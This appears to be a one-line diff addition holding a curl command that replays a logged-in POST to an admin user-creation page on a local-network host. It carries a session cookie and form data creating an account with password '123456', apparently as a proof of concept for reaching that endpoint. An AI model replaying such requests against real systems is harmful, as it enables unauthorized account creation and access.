+curl 'http://192.168.1.6/modules/admin/newuseradmin.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/newuseradmin.php?id=3960' -H 'Cookie: PHPSESSID=s0vaogg0ivfvvn8cf3d9a73q52' -H 'Upgrade-Insecure-Requests: 1' --data 'nom_form=eponimo&prenom_form=onoma&uname=username1&password=123456&email_form=mail%40mail.com&department=1&comment=sxolia+ka8igiti&language=el&submit=%CE%A5%CF%80%CE%BF%CE%B2%CE%BF%CE%BB%CE%AE&rid=3960&pstatut=1&auth=1'
